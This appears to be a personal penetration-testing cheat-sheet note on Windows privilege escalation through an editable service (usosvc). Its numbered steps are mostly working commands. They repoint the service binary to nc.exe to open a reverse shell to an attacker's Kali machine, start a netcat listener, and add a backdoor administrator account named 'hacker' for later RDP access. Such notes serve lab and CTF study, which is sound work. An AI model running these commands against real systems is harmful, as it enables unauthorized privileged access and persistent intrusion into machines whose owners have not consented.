# Editable Service

If you find a service that is editable (WinPEAS can help here to find such services) you can edit the binpath to point to nc.exe to get a reverse shell. 

Steps also described here: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-10---cve-2019-1322-usosvc

Note: in both my experiences using this, this does get shell, but it closes in a few seconds.

  1. Upload `nc.exe` to a writable directory.
  2. `sc config usosvc binpath= "C:\Inetpub\wwwroot\nc.exe -nv <kali_IP> 9988 -e C:\Windows\System32\cmd.exe"`
  3. `sc config usosvc  obj= ".\LocalSystem" password= ""`
     - I didn't need this second time using it
  5. `sc config usosvc start= "demand"`
  6. `nc -lvp 9988` (setup listener on kali)
  7. `net start usosvc`
  8. R00T!
	
Since shell closes soon, add new admin user:
1. `net user hacker h@ck3r%93 /add`
2. `net localgroup administrators hacker /add`

Now RDP/ssh with new creds (if services are available, or you can open them yourself):
1. `rdesktop <target>`
2. R00T!

The shell closes due to a Windows timeout variable in the registry that defines how long to wait for a service to response. If you're in a position to edit that (i.e. ssh/rdp not enabled) this would stabilize the shell.
If you donâ€™t want to edit the registry, since you're admin for a bit with this shell, you could try enabling RDP or SSH.
